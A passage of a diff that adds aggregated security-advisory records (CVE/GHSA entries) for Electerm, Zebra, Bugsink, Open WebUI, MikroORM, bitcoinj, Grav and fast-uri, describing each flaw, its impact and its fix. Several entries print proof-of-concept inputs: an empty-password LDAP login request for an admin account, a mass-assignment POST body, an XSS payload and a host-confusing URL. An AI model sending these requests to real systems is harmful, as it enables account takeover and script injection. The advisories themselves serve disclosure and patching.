+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939324+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-37j4-88rp-2f6h",
+        "https://github.com/electerm/electerm/security/advisories/GHSA-37j4-88rp-2f6h",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-43942"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Electerm's full process.env exposed to renderer via window.pre.env"
+    },
+    {
+      "canonical_id": "CVE-2026-43943",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-78",
+        "CWE-88"
+      ],
+      "description": "### Impact\n\nA code execution (RCE) vulnerability exists in electerm's SFTP open with system editor or \"Edit with custom editor\" feature. When a user opts to edit a file using open with system editor or open with a custom editor, the filename is passed directly into a command line without sanitization.\n\nA malicious actor controlling the SSH server or user OS can exploit this by crafting a filename containing shell metacharacters. If a victim subsequently attempts to edit this file, the injected commands are executed on their machine with the user's privileges. This could allow the attacker to run arbitrary code, install malware, or move laterally within the network.\n\n<img width=\"1792\" height=\"817\" alt=\"1\" src=\"https://github.com/user-attachments/assets/ddf78890-e95d-4fe7-981e-f86887677e8b\" />\n<img width=\"1648\" height=\"941\" alt=\"2\" src=\"https://github.com/user-attachments/assets/cca2295b-2053-4d99-a464-be51eac2f5be\" />\n\n### Patches\n\nFixed in version >= 3.7.9\n\n- https://github.com/electerm/electerm/commit/24ce7103e264cffe6eb5476c0506a2379e6f8333\n\n### Workarounds\n\nUntil a patch is available, it is strongly recommended to:  \n- Refrain from using the open with system editor  or \"Edit with custom editor\" feature when connected to untrusted or unfamiliar SSH servers.  \n- Consider using the built-in editor for viewing files, as this path may not be vulnerable to the same injection.  \n- If the feature must be used, ensure connections are exclusively established with trusted servers and perform rigorous filename validation before editing.\n\n### Resources\n\n- [electerm GitHub Repository](https://github.com/electerm/electerm)",
+      "first_seen": "2026-05-08T19:41:44.939307+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939307+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-q4p8-8j9m-8hxj",
+        "https://github.com/electerm/electerm/commit/24ce7103e264cffe6eb5476c0506a2379e6f8333",
+        "https://github.com/electerm/electerm/releases/tag/v3.7.9",
+        "https://github.com/electerm/electerm/security/advisories/GHSA-q4p8-8j9m-8hxj",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-43943"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Electerm Security Vulnerability: RCE via malicious SSH server filename in openFileWithEditor"
+    },
+    {
+      "canonical_id": "CVE-2026-43944",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-20",
+        "CWE-829",
+        "CWE-94"
+      ],
+      "description": "### Impact\n_Arbitrary local code execution via deep links, CLI `--opts`, or crafted shortcuts. Affected users: electerm installs that accept protocol URLs or CLI options (affected versions listed in the original report). Exploit requires clicking a crafted `electerm://...` link or opening a crafted shortcut/command that launches electerm with attacker-controlled `opts`._\n\n### Patches\nFixed in version > 3.8.8\n\nCommits:\n\n- https://github.com/electerm/electerm/commit/8a6a17951e96d715f5a231532bbd8303fe208700\n- https://github.com/electerm/electerm/commit/a79e06f4a1f0ac6376c3d2411ef4690fa0377742\n\n### Workarounds\n- Disable or unregister electerm protocol handlers (Deep Link settings) and avoid clicking `electerm://` links.\n- Do not run electerm with untrusted `--opts` arguments or open `.lnk` / `.desktop` files from untrusted sources.\n- Restrict which users can launch electerm on shared machines and avoid leaving electerm installed in locations reachable by other users.\n- As a temporary measure, run electerm in a confined account or sandbox (non-admin user) to reduce impact.\n\n### Resources\n- Report / credit: https://github.com/Curly-Haired-Baboon\n- Electerm releases: https://github.com/electerm/electerm/releases",
+      "first_seen": "2026-05-08T19:41:44.939288+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939288+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-mpm8-cx2p-626q",
+        "https://github.com/electerm/electerm/commit/8a6a17951e96d715f5a231532bbd8303fe208700",
+        "https://github.com/electerm/electerm/commit/a79e06f4a1f0ac6376c3d2411ef4690fa0377742",
+        "https://github.com/electerm/electerm/releases/tag/v3.8.15",
+        "https://github.com/electerm/electerm/security/advisories/GHSA-mpm8-cx2p-626q",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-43944"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Electerm users can run dangrous code through link or command line"
+    },
+    {
+      "canonical_id": "CVE-2026-44499",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-770"
+      ],
+      "description": "## Summary\n\nA composite denial-of-service vulnerability in Zebra's block discovery pipeline allows an unauthenticated remote attacker to permanently halt all new block discovery on a targeted node. The attack exploits three independent weaknesses in the gossip, syncer, and download subsystems \u2014 all exercisable from a single TCP connection \u2014 to create a monotonically growing block deficit that never self-heals.\n\n## Severity\n\n**Critical** \u2014 This is a Denial of Service vulnerability that requires no authentication, no special privileges, and only a single peer connection. The halt is permanent: the node will never recover without operator intervention.\n\n## Affected Versions\n\nAll Zebra versions prior to 4.4.0.\n\n## Description\n\nZebra discovers new blocks through two complementary paths: a gossip path (peers announce blocks via `inv` messages, triggering individual block downloads) and a syncer path (Zebra periodically queries peers with `FindBlocks`/`FindHeaders` to discover chains of missing blocks). Both paths must function for normal operation.\n\nThe gossip path was vulnerable because there was no per-connection rate limit on `inv` messages. A single connection could send enough sequential `inv` messages with fake block hashes to fill the entire gossip download queue in under a millisecond. The `FullQueue` return value was silently ignored, so legitimate block announcements from honest peers were dropped with no warning.\n\nThe syncer backup path could be degraded by responding with empty `inv` to `FindBlocks` requests and with `NotFound` to block download requests. Both are valid protocol responses that carried zero misbehavior penalty. The attacker's connection was never banned and never disconnected, allowing the degradation to persist indefinitely.\n\nCombining these two vectors, an attacker could suppress both block discovery paths simultaneously from a single connection, causing the node to fall permanently behind the chain tip.\n\n## Impact\n\n**Denial of Service**\n\n* **Attack Vector:** Network, unauthenticated. Requires only a single TCP peer connection.\n* **Effect:** Permanent halt of block discovery. The targeted node falls behind the chain tip and never recovers without operator intervention.\n* **Scope:** Any Zebra node reachable by the attacker over the peer-to-peer network.\n\n## Fixed Versions\n\nThis issue is fixed in Zebra 4.4.0.\n\nThe fix drops connections that send empty responses to `FindBlocks` and `FindHeaders` messages, preventing attackers from degrading the syncer path without consequence.\n\n## Mitigation\n\nUsers should upgrade to Zebra 4.4.0 or later immediately.\n\nThere are no known workarounds for this issue. Immediate upgrade is the only way to protect against this attack.\n\n## Credits\n\nZebra the researcher who reported this issue through the coordinated disclosure process.",
+      "first_seen": "2026-05-08T19:41:44.938997+00:00",
+      "frameworks": [
+        "rust"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.938997+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/ZcashFoundation/zebra/security/advisories/GHSA-h9hm-m2xj-4rq9",
+        "https://github.com/advisories/GHSA-h9hm-m2xj-4rq9",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-44499"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Zebra has Permanent Block Discovery Halt via Gossip Queue Saturation and Syncer Poisoning"
+    },
+    {
+      "canonical_id": "CVE-2026-44502",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-918"
+      ],
+      "description": "## Summary\n\nBugsink\u2019s webhook URL validation in versions 2.1.2 and earlier could be (partially) bypassed because of a mismatch in URL parsing.\n\nIn some malformed URLs, Python\u2019s standard URL  parser (urllib) and the HTTP client stack (requests / urllib3) do not agree on which host is actually being targeted. That could allow a webhook URL to pass Bugsink\u2019s outbound-host checks while the actual HTTP request is sent somewhere else.\n\n## Impact\n\nThis issue affects Bugsink\u2019s outbound webhook integrations.\n\nAn attacker who can supply or influence a webhook URL may be able to make Bugsink send an outbound HTTP POST request to a host that should have been blocked by the webhook validation logic, including loopback,\nprivate, or otherwise non-allowlisted destinations.\n\nThe practical impact is limited:\n\n- this is an outbound webhook SSRF issue, not a general-purpose proxy\n- Bugsink does not follow redirects for these webhook requests\n- the request shape is constrained by how the malformed URL is normalized by the HTTP client\n- this does not give arbitrary control over every possible request path\n\nIn other words, this is a real validation bypass, but it is narrower than a full arbitrary-request primitive.\n\n## Technical Details\n\nThe original validation logic parsed webhook URLs with Python\u2019s urllib.parse.urlparse, then sent the request with requests.post.\n\nFor malformed inputs involving backslashes and @, those components can disagree about where the authority ends and which hostname is the real target. A URL may therefore appear to target an allowlisted public\nhostname during validation, while the HTTP client actually connects to a different host.\n\n## Fix\n\nThe fix has two parts:\n\n1. Bugsink now normalizes webhook URLs using the same HTTP client stack that will later send them, and applies validation to that normalized form.\n2. Bugsink now outright rejects raw webhook URLs containing characters outside the RFC URL character set, rather than relying on downstream normalization of malformed input.\n\nTogether, these changes remove the parser discrepancy and make webhook URL handling stricter and more predictable.\n\n## Workarounds\n\nIf users cannot upgrade immediately:\n\n- restrict who can configure or modify webhook URLs\n- review existing webhook configurations for malformed or unusual URLs\n- prefer tightly controlled outbound network policy at the deployment level",
+      "first_seen": "2026-05-08T19:41:44.939049+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939049+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-fp53-qcf8-2xx2",
+        "https://github.com/bugsink/bugsink/commit/940d2df635e06803ef658666d734306942db5cc7",
+        "https://github.com/bugsink/bugsink/releases/tag/2.1.3",
+        "https://github.com/bugsink/bugsink/security/advisories/GHSA-fp53-qcf8-2xx2"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Bunsink has an SSRF bypass in `validate_webhook_url`"
+    },
+    {
+      "canonical_id": "CVE-2026-44550",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-862"
+      ],
+      "description": "# Mass Assignment via Pydantic extra='allow' Allows Creating Folders in Other Users' Accounts\n\n## Affected Component\n\nFolder creation endpoint and form model:\n- `backend/open_webui/models/folders.py` (lines 72-77, `FolderForm` with `extra='allow'`)\n- `backend/open_webui/models/folders.py` (lines 95-106, `insert_new_folder` dict construction)\n- `backend/open_webui/routers/folders.py` (line 119, `create_folder` endpoint)\n\n## Affected Versions\n\nCurrent main branch (commit `6fdd19bf1`) and likely all versions since `FolderForm` adopted `extra='allow'`.\n\n## Description\n\n`FolderForm` uses `model_config = ConfigDict(extra='allow')`, which permits arbitrary fields to pass through Pydantic validation and be included in `model_dump(exclude_unset=True)`. In `insert_new_folder`, the server-assigned `user_id` is placed at the start of the dict and then overwritten by the spread of form data:\n\n```python\n# models/folders.py:95-106\nfolder = FolderModel(\n    **{\n        'id': id,                                              # server\n        'user_id': user_id,                                    # server \u2014 overwritten below\n        **(form_data.model_dump(exclude_unset=True) or {}),    # user-controlled (extra='allow')\n        'parent_id': parent_id,\n        'created_at': int(time.time()),\n        'updated_at': int(time.time()),\n    }\n)\n```\n\nBecause `FolderModel` declares `user_id: str` as a real field (not just a form extra), any attacker-supplied `user_id` in the POST body is accepted by the model and persisted on the `Folder` row.\n\n## Attack Scenario\n\n1. Attacker discovers a victim's user ID. User UUIDs commonly leak via the user search endpoint (`GET /api/v1/users/search`, intentionally accessible to verified users for sharing UI), shared chat metadata, or channel member lists.\n2. Attacker sends:\n   ```\n   POST /api/v1/folders/\n   {\n     \"name\": \"Important: Click here\",\n     \"user_id\": \"<victim_user_id>\",\n     \"meta\": {\"icon\": \"warning\"},\n     \"data\": {...}\n   }\n   ```\n3. Pydantic accepts the extra `user_id` field (allowed by `extra='allow'`).\n4. `insert_new_folder` spreads the form data over the server-set `'user_id': user_id`, overwriting it with the attacker's value.\n5. The `Folder` row is persisted with `user_id = <victim_user_id>`.\n6. The victim sees the attacker-planted folder in their UI on next load because `GET /api/v1/folders/` filters by the viewer's own `user_id`.\n\nThe attacker can repeat this to plant multiple folders, use crafted `name` values for phishing (\"Click here to recover account\" / \"Security alert\"), and abuse the `meta` and `data` fields to add visual elements that further mimic legitimate content.\n\n## Impact\n\n- Unauthorized write into victim's folder tree\n- Phishing surface: attacker-controlled `name`, `meta`, and `data` render in the victim's UI in a trusted context\n- DoS / spam: attacker can flood a victim with arbitrary folders; victim must manually delete each one\n- Attacker cannot read the folder back \u2014 all read paths filter by the caller's own `user_id` \u2014 so confidentiality is preserved, but integrity and trust are compromised\n\n## Preconditions\n\n- Attacker must have an authenticated account with `features.folders` permission (default for all users)\n- Attacker must know or guess the victim's user UUID (obtainable through various non-sensitive endpoints)",
+      "first_seen": "2026-05-08T19:41:44.938822+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.938822+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-hr43-rjmr-7wmm",
+        "https://github.com/open-webui/open-webui/security/advisories/GHSA-hr43-rjmr-7wmm"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Open WebUI's Mass Assignment via Pydantic extra='allow' Allows Creating Folders in Other Users' Accounts"
+    },
+    {
+      "canonical_id": "CVE-2026-44551",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-287"
+      ],
+      "description": "# LDAP Empty Password Authentication Bypass\n\n## Affected Component\n\nLDAP authentication endpoint:\n- `backend/open_webui/routers/auths.py` (lines 468-477, user bind with empty password)\n- `backend/open_webui/models/auths.py` (lines 58-60, `LdapForm` model)\n\n## Affected Versions\n\nCurrent main branch (commit `6fdd19bf1`) and likely all versions with LDAP authentication support.\n\n## Description\n\nThe LDAP authentication endpoint does not validate that the submitted password is non-empty before performing a Simple Bind against the LDAP server. Per RFC 4513 Section 5.1.2, a Simple Bind with a valid DN and an empty password constitutes an \"unauthenticated simple authentication\" \u2014 many LDAP servers (including OpenLDAP in default configuration and some Active Directory setups) return success (resultCode 0) for this operation.\n\nThe `LdapForm` Pydantic model accepts `password: str` with no minimum length constraint, so an empty string passes validation. The subsequent `Connection.bind()` call succeeds on vulnerable LDAP servers, and the application issues a full session token for the target user.\n\n```python\n# models/auths.py:58-60 \u2014 no min_length on password\nclass LdapForm(BaseModel):\n    user: str\n    password: str\n\n# auths.py:469-477 \u2014 empty password reaches LDAP bind\nconnection_user = Connection(\n    server,\n    user_dn,\n    form_data.password,    # can be \"\"\n    auto_bind='NONE',\n    authentication='SIMPLE',\n)\nif not await asyncio.to_thread(connection_user.bind):\n    raise HTTPException(400, 'Authentication failed.')\n\n# If bind succeeds (which it does with empty password on many servers),\n# execution continues and a full session token is issued\n```\n\n## CVSS 3.1 Breakdown\n\n| Metric | Value | Rationale |\n|--------|-------|-----------|\n| Attack Vector | Network (N) | Exploited remotely via the LDAP login endpoint |\n| Attack Complexity | Low (L) | Single request with an empty password field |\n| Privileges Required | None (N) | No prior authentication needed |\n| User Interaction | None (N) | No victim interaction required |\n| Scope | Unchanged (U) | Impact within the application's authentication boundary |\n| Confidentiality | High (H) | Full access to victim's account data \u2014 chats, files, API keys, settings |\n| Integrity | High (H) | Can modify victim's data, settings, send messages as victim |\n| Availability | None (N) | No direct denial of service |\n\n## Attack Scenario\n\n1. LDAP authentication is enabled on the Open WebUI instance.\n2. The underlying LDAP server accepts unauthenticated simple binds (OpenLDAP default, some AD configs).\n3. Attacker sends:\n   ```\n   POST /api/v1/auths/ldap\n   {\"user\": \"admin_username\", \"password\": \"\"}\n   ```\n4. The app DN bind succeeds normally (line 366), finds the target user via LDAP search.\n5. The user bind (line 469-477) sends a Simple Bind with the target's DN and an empty password.\n6. The LDAP server returns success for the unauthenticated bind.\n7. `authenticate_user_by_email` (line 507) issues a full session token for the target user.\n8. Attacker has complete access to the victim's account.\n\n## Impact\n\n- Complete authentication bypass \u2014 any LDAP user account can be taken over without knowing the password\n- Includes admin accounts if they authenticate via LDAP\n- No rate limiting on the LDAP endpoint (unlike the password signin endpoint)\n- Zero interaction required from the victim\n\n## Preconditions\n\n- LDAP must be enabled (`ENABLE_LDAP=True`, disabled by default)\n- The LDAP server must accept unauthenticated simple binds with empty passwords (OpenLDAP default behavior, configurable on AD)\n- Attacker must know a valid LDAP username",
+      "first_seen": "2026-05-08T19:41:44.938881+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.938881+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-2r4p-jpmg-48f4",
+        "https://github.com/open-webui/open-webui/security/advisories/GHSA-2r4p-jpmg-48f4"
+      ],
+      "severity": "critical",
+      "source_count": 1,
+      "title": "Open WebUI has an LDAP Empty Password Authentication Bypass"
+    },
+    {
+      "canonical_id": "CVE-2026-44680",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-89"
+      ],
+      "description": "## Summary\n\nMikroORM's identifier-quoting helper (`Platform.quoteIdentifier` and the postgres/mssql overrides) and its JSON-path emitters (`Platform.getSearchJsonPropertyKey`, `quoteJsonKey`) did not properly escape characters that delimit the SQL identifier or string-literal context they emit into. When application code passes attacker-influenced strings to public ORM APIs that expect an identifier or a JSON-property filter, an attacker can break out of the quoted context and inject arbitrary SQL.\n\n## Affected APIs\n\nThe vulnerability is reachable when application code passes an attacker-influenced string to any of the following documented APIs:\n\n* **Multi-tenant `schema` option** \u2014 `em.fork({ schema })`, `qb.withSchema(name)`, `wrap(entity).setSchema(name)`, `em.create(Cls, data, { schema })`. The schema name is concatenated into the SQL identifier and never had its dialect quote character escaped.\n* **`em.find` / `qb.where` JSON-property filters** \u2014 `em.find(Entity, { jsonCol: { [userKey]: value } })`. The user-supplied JSON sub-keys cannot be validated against any metadata (JSON columns are schemaless by design), and were spliced into the SQL string literal of the JSON path expression without escaping.\n* **`qb.where` / `qb.orderBy` / `qb.groupBy` / `qb.having` / `qb.select` keys** \u2014 keys containing `.` or `::` bypassed the structured-where metadata validator in `CriteriaNode`, then flowed through the same broken `quoteIdentifier`. Apps that forwarded raw filter keys from request input were already broken on authorization grounds (e.g. `{ isAdmin: true }`); the SQL injection here is a defence-in-depth failure on top of that.\n\nThe vulnerability does **not** affect documented escape-hatch APIs (`raw()`, the `sql` tagged template, `qb.raw()`, `em.raw()`) \u2014 those are documented as accepting raw SQL and are the application's responsibility to sanitize.\n\n## Impact\n\n* **Confidentiality** \u2014 read from any table/schema the database user has access to (cross-tenant data leak in multi-tenant deployments).\n* **Integrity** \u2014 on dialects supporting multi-statement queries (MSSQL, MySQL with multi-statement enabled), execute additional arbitrary SQL statements (data modification, in-database privilege escalation).\n* **Availability** \u2014 DROP/TRUNCATE via injected statements where the database user has the privilege.\n\n## Affected dialects\n\nAll SQL dialects supported by MikroORM. The identifier-quoting bug exists in every dialect's `quoteIdentifier` (the dialect's own quote character \u2014 backtick, double quote, or right bracket \u2014 was not doubled when embedded in the identifier). The JSON-path bug exists in all dialects' `getSearchJsonPropertyKey`/`quoteJsonKey`.\n\nMongoDB driver is **not** affected (no SQL).\n\n## Patches\n\n* v7: upgrade to **7.0.14** or later.\n* v6: upgrade to **6.6.14** or later.\n\nPatches:\n* Identifier quoting: #7653 (master) / #7654 (6.x)\n* JSON-path keys: #7656 (master) / #7657 (6.x)\n\n## Workarounds\n\nIf users cannot upgrade immediately:\n\n* For multi-tenant apps using `em.fork({ schema })` / `wrap().setSchema()` / `qb.withSchema()`: validate the schema name against a strict allowlist (e.g. `^[A-Za-z_][\\w$]*$`) **before** passing it to MikroORM.\n* For applications that pass `where` / `orderBy` filters from request input: validate every key against the entity's known properties before constructing the filter; do not pass keys containing `.` or `::` from user input.\n* For applications that allow filtering on JSON columns from request input: validate every JSON sub-key against an allowlist (or against `^[a-zA-Z_][\\w]*$`) before passing it to `em.find`.\n\n## Credits\n\nReported and patched by Martin Ad\u00e1mek (project maintainer) during an internal security review.",
+      "first_seen": "2026-05-08T19:41:44.938949+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.938949+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-cfw5-68c4-ffqp",
+        "https://github.com/mikro-orm/mikro-orm/pull/7654",
+        "https://github.com/mikro-orm/mikro-orm/pull/7657",
+        "https://github.com/mikro-orm/mikro-orm/security/advisories/GHSA-cfw5-68c4-ffqp"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "MikroORM has SQL injection via runtime-controlled identifiers and JSON-path keys"
+    },
+    {
+      "canonical_id": "CVE-2026-44714",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-347"
+      ],
+      "description": "### Summary\n`ScriptExecution.correctlySpends()` contains two fast-path verification bugs for standard `P2PKH` and native `P2WPKH` spends in `core/src/main/java/org/bitcoinj/script/ScriptExecution.java`.\n\nIn both branches, bitcoinj verifies an attacker-controlled signature/public-key pair but fails to verify that the public key is the one committed to by the output being spent. As a result, any attacker keypair can satisfy bitcoinj's local verification for arbitrary `P2PKH` and `P2WPKH` outputs.\n\nThis doesn't affect the SPV (simple payment verification) trust model, as this model follows PoW and doesn't verify input signatures at all.\n\n### Details\nThe issue is in the optimized branches of `ScriptExecution.correctlySpends(...)`.\n\nIn the `P2PKH` fast path at `core/src/main/java/org/bitcoinj/script/ScriptExecution.java:1042`, the code:\n\n- parses the attacker-supplied signature from `scriptSig`\n- parses the attacker-supplied public key from `scriptSig`\n- computes the sighash against the victim output's `scriptPubKey`\n- checks only `pubkey.verify(sigHash, signature)`\n\nIt never enforces the missing `P2PKH` binding:\n\n- `HASH160(pubkey) == ScriptPattern.extractHashFromP2PKH(scriptPubKey)`\n\nThat means the `OP_DUP OP_HASH160 <hash> OP_EQUALVERIFY OP_CHECKSIG` semantics are not actually enforced in this fast path.\n\nRelevant code:\n\n```java\n} else if (ScriptPattern.isP2PKH(scriptPubKey)) {\n    if (chunks.size() != 2)\n        throw new ScriptException(...);\n    TransactionSignature signature;\n    try {\n        byte[] data = Objects.requireNonNull(chunks.get(0).data);\n        signature = TransactionSignature.decodeFromBitcoin(data, true, true);\n    } catch (SignatureDecodeException x) {\n        throw new ScriptException(...);\n    }\n    ECKey pubkey = ECKey.fromPublicOnly(Objects.requireNonNull(chunks.get(1).data));\n    Sha256Hash sigHash = txContainingThis.hashForSignature(scriptSigIndex, scriptPubKey,\n            signature.sigHashMode(), false);\n    boolean validSig = pubkey.verify(sigHash, signature);\n    if (!validSig)\n        throw new ScriptException(...);\n}\n```\n\nIn the native `P2WPKH` fast path at `core/src/main/java/org/bitcoinj/script/ScriptExecution.java:1023`, the bug is similar. The code:\n\n- reads the attacker-supplied pubkey from `witness`\n- builds `scriptCode` from that attacker pubkey with `ScriptBuilder.createP2PKHOutputScript(pubkey)`\n- computes the BIP143 sighash using that attacker-derived `scriptCode`\n- verifies the signature against the attacker pubkey\n\nIt never enforces:\n\n- `HASH160(pubkey) == ScriptPattern.extractHashFromP2WH(scriptPubKey)`\n\nSo for `P2WPKH`, the attacker controls both the pubkey and the `scriptCode` used for signing.\n\nRelevant code:\n\n```java\nif (ScriptPattern.isP2WPKH(scriptPubKey)) {\n    Objects.requireNonNull(witness);\n    if (witness.getPushCount() < 2)\n        throw new ScriptException(...);\n    TransactionSignature signature;\n    try {\n        signature = TransactionSignature.decodeFromBitcoin(witness.getPush(0), true, true);\n    } catch (SignatureDecodeException x) {\n        throw new ScriptException(...);\n    }\n    ECKey pubkey = ECKey.fromPublicOnly(witness.getPush(1));\n    Script scriptCode = ScriptBuilder.createP2PKHOutputScript(pubkey);\n    Sha256Hash sigHash = txContainingThis.hashForWitnessSignature(scriptSigIndex, scriptCode, value,\n            signature.sigHashMode(), false);\n    boolean validSig = pubkey.verify(sigHash, signature);\n    if (!validSig)\n        throw new ScriptException(...);\n}\n```\n\nAffected call sites include:\n\n- `core/src/main/java/org/bitcoinj/core/TransactionInput.java:546`\n- `core/src/main/java/org/bitcoinj/wallet/Wallet.java:4520`\n- `core/src/main/java/org/bitcoinj/signers/LocalTransactionSigner.java:84`\n- `core/src/main/java/org/bitcoinj/signers/CustomTransactionSigner.java:77`\n\nThese call sites use `correctlySpends()` for transaction/input validation and pre-signing checks. Any application that treats a successful result from this path as proof that a spend is valid is affected.\n\n### Fix\nThe issue is fixed on the `release-0.17` branch via 2bc5653c41d260d840692bc554690d4d79208f9c, and on `master` via b575a682acf614b9ff95cacbdeb48f86c3ababe0. A 0.17.1 maintenance release has been made available on Maven Central.",
+      "first_seen": "2026-05-08T19:41:44.939495+00:00",
+      "frameworks": [
+        "maven"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.939495+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-hfcf-v2f8-x9pc",
+        "https://github.com/bitcoinj/bitcoinj/releases/tag/v0.17.1",
+        "https://github.com/bitcoinj/bitcoinj/security/advisories/GHSA-hfcf-v2f8-x9pc"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "bitcoinj has a ScriptExecution P2PKH/P2WPKH Verification Bypass"
+    },
+    {
+      "canonical_id": "CVE-2026-44737",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "### Summary\n_A Stored Cross-Site Scripting (XSS) vulnerability was identified in the /admin/pages/[page] endpoint of the Grav application. This vulnerability allows attackers to inject malicious scripts into the data[header][title] parameter._\n\n--- \n\n### Details\nVulnerable Endpoint: GET /admin/pages/[page]\nParameter: data[header][title]\n\nThe application fails to properly validate and sanitize user input in the data[header][title] parameter. As a result, attackers can craft a malicious URL with an XSS payload. When this URL is accessed, the injected script is reflected back in the HTTP response and executed within the context of the victim's browser session.\n\n--- \n\n### PoC\n**Payload:** `<img src=1 onerror=alert(1)>`\n\n1. Log in to the Grav Admin Panel and navigate to Pages.\n \n2. Create a new page or edit an existing one.\n\n3. Edit title of the page to  `<img src=1 onerror=alert(1)>`\n\n<img width=\"1897\" height=\"700\" alt=\"image\" src=\"https://github.com/user-attachments/assets/77a129ca-5c2b-4743-8c56-c17fa456eefa\" />\n\n4. Save page\n \n5. Open the move function and click on the folder having the payload\n\n<img width=\"1904\" height=\"984\" alt=\"image\" src=\"https://github.com/user-attachments/assets/44f8f88f-76c4-449f-8c4e-11e8e2c51d8f\" />\n\n<img width=\"1902\" height=\"995\" alt=\"image\" src=\"https://github.com/user-attachments/assets/1dc2ef15-e534-4e87-93ea-92bc573af7f1\" />\n\n--- \n\n### Impact\n\nStored cross-site scripting (XSS) attacks can have serious consequences, including:\n\n- User actions: Attackers can perform actions on behalf of the user\n\n- Data theft: Sensitive information such as session cookies can be stolen\n\n- Account compromise: Attackers may impersonate legitimate users\n\n- Malicious code execution: Arbitrary JavaScript code can run in the user\u2019s browser\n\n- Website defacement or misinformation: Malicious output may be injected visually\n\n- User redirection: Victims may be redirected to phishing or malicious websites\n\nBy [Vu Duc Hieu](https://github.com/vdh1612) \nContributor [Simon Tran](https://github.com/simontranduy)",
+      "first_seen": "2026-05-08T19:41:44.938904+00:00",
+      "frameworks": [
+        "composer"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.938904+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-fmg2-f5r9-24qc",
+        "https://github.com/getgrav/grav/security/advisories/GHSA-fmg2-f5r9-24qc"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Grav: Stored XSS via page title (data[header][title]) in admin panel"
+    },
+    {
+      "canonical_id": "CVE-2026-6322",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-436"
+      ],
+      "description": "### Impact\n\n`fast-uri` v3.1.1 and earlier decodes percent-encoded authority delimiters (`%40` as `@`, `%3A` as `:`) inside the host component and serializes them back as raw characters. This changes the URI structure, turning a hostname into userinfo plus a different host.\n\nFor example, `http://trusted.com%40evil.com/` normalizes to `http://trusted.com@evil.com/`, which reparses as host `evil.com` with userinfo `trusted.com`.\n\nApplications that normalize untrusted URLs before host allowlist checks, redirect validation, or outbound request routing can be steered to a different authority than the original URL appeared to contain.\n\n### Patches\n\nUpgrade to `fast-uri` >= 3.1.2.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+      "first_seen": "2026-05-08T19:41:44.938964+00:00",
+      "frameworks": [
+        "npm"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-08T19:41:44.938964+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://cna.openjsf.org/security-advisories.html",
